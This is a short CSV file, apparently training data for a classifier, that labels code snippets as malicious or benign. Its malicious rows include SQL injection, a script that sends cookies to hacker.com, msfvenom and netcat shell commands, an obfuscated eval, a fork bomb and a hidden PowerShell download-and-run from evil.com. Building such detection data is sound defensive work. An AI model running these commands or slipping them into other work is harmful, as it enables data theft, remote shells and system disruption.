"File_Content","Label"
"'; DROP TABLE users; --","1"
"<script>fetch('http://hacker.com/steal?cookie=' + document.cookie);</script>","1"
"msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe","1"
"eval(unescape('%65%76%61%6c%28%22%61%6c%65%72%74%28%27%48%61%63%6b%65%64%27%29%22%29'));","1"
"nc -lvp 4444 -e /bin/bash","1"
"while(1) { fork(); }","1"
"import requests; print(requests.get('https://google.com').status_code)","0"
"System.out.println('Hello, this is a safe Java program');","0"
"git clone https://github.com/scikit-learn/scikit-learn.git","0"
"npm install express body-parser cookie-parser","0"
"powershell.exe -noexit -executionpolicy bypass -windowstyle hidden -command ""IEX (New-Object System.Net.WebClient).DownloadString('http://evil.com/shell.ps1')""","1"
"ssh-copy-id user@remote-host","0"
